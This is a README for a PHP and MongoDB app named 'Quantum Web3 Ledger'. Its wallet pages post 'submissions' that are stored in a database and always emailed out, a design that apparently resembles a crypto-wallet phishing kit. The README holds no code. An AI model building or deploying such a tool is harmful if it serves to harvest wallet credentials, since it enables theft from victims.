# Quantum Web3 Ledger

PHP application for wallet submission processing.

## Prerequisites
- PHP `8.3` with `ext-mongodb` enabled (required for MongoDB driver)
- Composer (`composer.phar` is included; PHP OpenSSL must be enabled)

## Quick Start (Local, using MongoDB Atlas)
1. Copy `.env.example` to `.env`
2. Set `DB_URI` to your Atlas connection string (SRV or standard):
   - Example: `mongodb+srv://user:pass@cluster.mongodb.net/quantum_ledger`
   - Alternatively set `DB_HOST`, `DB_PORT`, `DB_NAME`, `DB_USER`, `DB_PASS`, and `DB_AUTHSOURCE`
3. Ensure PHP has `ext-mongodb` loaded:
   - Check: `php -m` shows `mongodb`
   - If missing on Windows, use PHP 8.3 and install the Windows DLL for `mongodb` from pecl, then add `extension=mongodb` to `php.ini`
4. Install deps: `php composer.phar install`
5. Start locally: `php -S 127.0.0.1:8000 -t .`

## Quick Start (Local, using Local MongoDB)
- Set `DB_HOST=localhost`, `DB_PORT=27017`, and database credentials in `.env`
- Ensure the local MongoDB server is running and accessible

## Deploy (Online)
### Container (recommended)
- Uses the provided `Dockerfile` (PHP 8.3 + Apache + pecl mongodb)
- Build and run locally or deploy to any container platform
- Configure environment variables (`DB_URI` or discrete `DB_*`, plus SMTP)

### Nixpacks
- Uses `nixpacks.toml` for a simple build and run, but you must ensure `ext-mongodb` is available in the runtime
- Prefer the Dockerfile for MongoDB driver compatibility

## Notes
- The API supports both full `DB_URI` and discrete `DB_*` variables
- If MongoDB fails (e.g., driver missing or connection error), submission still attempts email delivery
- CSRF tokens are issued via `api/session.php` and required by `api/process.php`

## Usage
- Access via the wallet pages (e.g., `index.html` or `wallet*.php`) which post to `api/process.php`
